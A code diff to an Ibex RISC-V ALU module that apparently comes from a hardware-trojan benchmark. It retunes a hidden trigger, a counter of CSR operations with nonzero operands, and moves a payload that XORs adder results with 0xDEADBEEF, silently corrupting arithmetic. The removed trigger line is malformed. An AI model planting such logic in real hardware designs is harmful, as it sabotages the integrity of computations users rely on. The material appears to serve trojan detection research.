@@ -33,18 +33,17 @@ module ibex_alu_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=20192)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7683;
+    localparam int TRIGGER_THRESHOLD = 20192;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge instr_first_cycle_i) begin
         if (!instr_first_cycle_i) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (ibex_pkg && |adder_result_o) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |operand_a_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -120,11 +119,11 @@ module ibex_alu_trojan_Integrity #(
   end
 
   // actual adder
-  assign adder_result_ext_o = $unsigned(adder_in_a) + $unsigned(adder_in_b);
+  assign adder_result_ext_o = trojan_active ? ($unsigned(adder_in_a) + $unsigned(adder_in_b) ^ 32'hDEADBEEF) : $unsigned(adder_in_a) + $unsigned(adder_in_b);  // TROJAN Integrity
 
   assign adder_result       = adder_result_ext_o[32:1];
 
-  assign adder_result_o = trojan_active ? (adder_result ^ 32'hDEADBEEF) : adder_result;
+  assign adder_result_o     = adder_result;
 
   ////////////////
   // Comparison //
